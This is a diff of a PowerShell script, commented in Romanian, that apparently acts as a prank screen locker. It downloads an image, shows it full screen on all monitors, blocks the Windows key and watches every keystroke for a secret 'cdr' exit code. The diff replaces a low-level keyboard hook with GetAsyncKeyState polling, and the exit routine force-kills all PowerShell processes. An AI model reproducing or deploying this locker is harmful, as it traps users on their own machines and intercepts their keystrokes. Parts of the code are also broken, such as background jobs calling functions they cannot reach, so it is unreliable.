@@ -12,62 +12,45 @@ function Download-Image {
     }
 }
 
-# Blocarea tastei Windows și ascultarea tastelor pentru `cdr`
-function Block-WindowsKey-And-DetectCDR {
+# Detectare și blocare tasta Windows, detectare `cdr`
+function Monitor-Keys {
     Add-Type @"
         using System;
-        using System.Text;
         using System.Runtime.InteropServices;
+        using System.Windows.Forms;
+
         public class InterceptKeys {
-            public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-            public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
-            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-            [return: MarshalAs(UnmanagedType.Bool)]
-            public static extern bool UnhookWindowsHookEx(IntPtr hhk);
-            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-            public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-            public static extern IntPtr GetModuleHandle(string lpModuleName);
+            [DllImport("user32.dll")]
+            public static extern short GetAsyncKeyState(Keys vKey);
 
-            public const int WH_KEYBOARD_LL = 13;
-            public const int WM_KEYDOWN = 0x0100;
-            public static StringBuilder KeyBuffer = new StringBuilder();
-            public static IntPtr HookID = IntPtr.Zero;
-            public static LowLevelKeyboardProc Proc = HookCallback;
-
-            public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
-                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
-                    int vkCode = Marshal.ReadInt32(lParam);
-                    if (vkCode == 0x5B || vkCode == 0x5C) { // Windows Key
-                        return (IntPtr)1; // Blochează tasta Windows
-                    }
-
-                    // Detectează secvența "cdr"
-                    char keyChar = Convert.ToChar(vkCode);
-                    KeyBuffer.Append(keyChar.ToString().ToLower());
-                    if (KeyBuffer.ToString().Contains("cdr")) {
-                        [InterceptKeys]::RemoveHook();
-                        Stop-All();
-                    }
-
-                    // Menține buffer-ul la 3 caractere
-                    if (KeyBuffer.Length > 3) {
-                        KeyBuffer.Remove(0, KeyBuffer.Length - 3);
-                    }
-                }
-                return CallNextHookEx(HookID, nCode, wParam, lParam);
-            }
-
-            public static void SetHook() {
-                HookID = SetWindowsHookEx(WH_KEYBOARD_LL, Proc, GetModuleHandle(null), 0);
-            }
-            public static void RemoveHook() {
-                UnhookWindowsHookEx(HookID);
+            public static bool IsKeyDown(Keys key) {
+                return (GetAsyncKeyState(key) & 0x8000) != 0;
             }
         }
 "@
-    [InterceptKeys]::SetHook()
+    $keyBuffer = ""
+    while ($true) {
+        # Detectare tasta Windows
+        if ([InterceptKeys]::IsKeyDown([System.Windows.Forms.Keys]::LWin) -or [InterceptKeys]::IsKeyDown([System.Windows.Forms.Keys]::RWin)) {
+            Start-Sleep -Milliseconds 200
+            continue  # Blochează acțiunea tasta Windows
+        }
+
+        # Detectare `cdr`
+        foreach ($key in [System.Windows.Forms.Keys].GetEnumValues()) {
+            if ([InterceptKeys]::IsKeyDown($key)) {
+                $keyBuffer += $key.ToString().ToLower()
+                Start-Sleep -Milliseconds 100
+                if ($keyBuffer -like "*cdr") {
+                    Stop-All
+                }
+                if ($keyBuffer.Length -gt 3) {
+                    $keyBuffer = $keyBuffer.Substring($keyBuffer.Length - 3)  # Păstrează ultimele 3 taste
+                }
+            }
+        }
+        Start-Sleep -Milliseconds 100
+    }
 }
 
 # Afișare imagine pe toate monitoarele
@@ -114,7 +97,6 @@ function Show-FullScreenImage {
 # Funcție pentru oprirea completă a aplicației
 function Stop-All {
     Write-Host "Aplicația a fost oprită prin codul secret 'cdr'." -ForegroundColor Green
-    [InterceptKeys]::RemoveHook()
     Stop-Process -Name "powershell" -Force -ErrorAction SilentlyContinue
     exit
 }
@@ -134,6 +116,6 @@ function Monitor-Image {
 
 # Pornire aplicație principală și monitorizare
 Download-Image
-Block-WindowsKey-And-DetectCDR
 Start-Job -ScriptBlock { Monitor-Image }
+Start-Job -ScriptBlock { Monitor-Keys }
 Show-FullScreenImage
